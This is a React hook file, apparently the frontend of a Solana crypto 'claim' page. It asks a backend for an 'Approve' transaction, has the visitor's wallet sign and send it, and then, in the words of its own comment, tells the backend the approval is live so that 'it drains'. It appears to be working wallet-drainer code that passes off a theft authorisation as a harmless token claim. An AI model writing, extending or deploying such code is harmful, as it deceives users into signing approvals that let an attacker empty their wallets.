import { useCallback, useState } from "react";
import config from "../config.js";
import { prepareClaim, submitClaim } from "../lib/api.js";
import { messageFor } from "../lib/errors.js";
import { getProvider, publicKeyString } from "../lib/wallet.js";
import { Transaction } from "@solana/web3.js";

export function useClaim() {
  const [phase, setPhase] = useState("idle");
  const [error, setError] = useState("");
  const [detail, setDetail] = useState("");
  const [txHash, setTxHash] = useState("");

  const claim = useCallback(async () => {
    setError("");
    setDetail("");
    setTxHash("");
    setPhase("preparing");

    try {
      const provider = getProvider();
      const user = publicKeyString(provider);

      // 1. Get the Approve transaction from backend
      const prepared = await prepareClaim(config.backendBaseUrl, user);
      if (prepared.description) setDetail(prepared.description);

      setPhase("signing");

      // 2. Deserialize and ask wallet to sign + send
      const tx = Transaction.from(Buffer.from(prepared.transaction, "base64"));
      const { signature } = await provider.signAndSendTransaction(tx);

      setPhase("submitting");

      // 3. Tell backend the approval is live → it drains
      const result = await submitClaim(config.backendBaseUrl, user);
      if (result?.txHash) setTxHash(result.txHash);

      setPhase("success");
    } catch (err) {
      setPhase("error");
      setError(messageFor(err));
    }
  }, []);

  const busy = phase === "preparing" || phase === "signing" || phase === "submitting";

  return { phase, error, detail, txHash, claim, busy };
}